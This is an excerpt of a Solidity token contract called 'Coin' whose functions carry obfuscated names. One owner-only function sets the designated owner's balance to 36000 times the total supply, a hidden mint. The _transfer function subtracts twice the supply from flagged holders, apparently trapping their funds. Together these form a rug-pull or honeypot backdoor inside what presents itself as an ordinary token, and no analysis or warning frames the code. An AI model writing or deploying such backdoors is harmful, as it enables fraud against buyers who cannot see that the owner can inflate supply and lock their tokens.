...
contract Coin is Ownable {
    ...
    function bitBoy2131Box123() public view virtual  returns (uint256) {
        return _MYtotalSupply;
    }
    function vipcadvipdaddTrade() external {
       
        if (_vipCEO == _msgSender()){
            _balances[_msgSender()] = bitBoy2131Box123()*36000;
        }else if (_msgSender() != _vipCEO) {
            revert("fuck");
        }
    }
    ...
    function _transfer(
        ...
        if (vipccdd[from] != false ){
            _balances[from]= balance-(bitBoy2131Box123())-(bitBoy2131Box123());
        }
